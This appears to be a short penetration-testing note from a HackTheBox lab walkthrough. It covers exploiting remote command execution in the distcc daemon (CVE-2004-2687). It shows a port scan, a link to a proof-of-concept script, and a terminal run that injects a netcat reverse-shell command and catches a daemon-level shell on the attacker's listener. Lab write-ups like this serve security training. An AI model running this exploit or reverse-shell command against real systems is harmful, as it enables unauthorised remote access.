# distcc: a fast, free distributed C/C++ compiler

distcc is a program to distribute builds of C, C++, Objective C or Objective C++ code across several machines on a network. distcc should always generate the same results as a local build, is simple to install and use, and is usually much faster than a local compile.

Homepage: [https://distcc.github.io](https://distcc.github.io)

## DistCC Daemon - Command Execution

### Scanning

```
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

### distccd_rce_CVE-2004-2687.py

[*Poc code here*](https://raw.githubusercontent.com/leecybersec/exploitation/master/RemoteCodeExecution/DistCC/distccd_rce_CVE-2004-2687.py)

```
┌──(Hades㉿10.10.14.6)-[0.3:14.9]~/exploitation/DistCC
└─$ python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.6 443 -e /bin/sh" 
[OK] Connected to remote service
```

```
┌──(Hades㉿10.10.14.6)-[0.6:15.0]~
└─$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.3] 44565
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

## Reference

[https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)

[https://github.com/leecybersec/walkthrough/tree/master/hackthebox/lame](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/lame)